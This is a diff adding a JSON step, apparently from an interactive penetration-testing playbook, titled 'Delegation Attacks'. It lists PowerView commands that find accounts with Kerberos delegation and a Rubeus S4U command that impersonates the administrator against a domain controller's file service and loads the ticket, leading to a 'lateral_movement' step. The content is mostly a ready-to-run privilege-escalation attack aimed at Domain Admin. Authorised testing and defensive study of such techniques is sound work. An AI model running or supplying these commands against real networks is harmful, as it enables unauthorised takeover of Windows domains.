@@ -1,0 +1,14 @@
+{
+  "id": "delegation",
+  "phase": "AD",
+  "title": "Delegation Attacks",
+  "body": "Unconstrained delegation captures TGTs. Constrained delegation allows S4U impersonation. Both can reach Domain Admin.",
+  "cmd": "# Find unconstrained delegation\nGet-DomainComputer -Unconstrained | select name\nGet-DomainUser -AllowDelegation -AdminCount | select name\n\n# Find constrained delegation\nGet-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto\nGet-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto\n\n# S4U2Self + S4U2Proxy (Rubeus — no MSF)\n.\\Rubeus.exe s4u \\\n  /user:svcaccount \\\n  /rc4:NTLM_HASH \\\n  /impersonateuser:administrator \\\n  /msdsspn:\"CIFS/dc01.domain.com\" \\\n  /ptt\n\n# Verify ticket loaded\n.\\Rubeus.exe klist",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Ticket loaded — lateral move to DC",
+      "next": "lateral_movement"
+    }
+  ]
+}
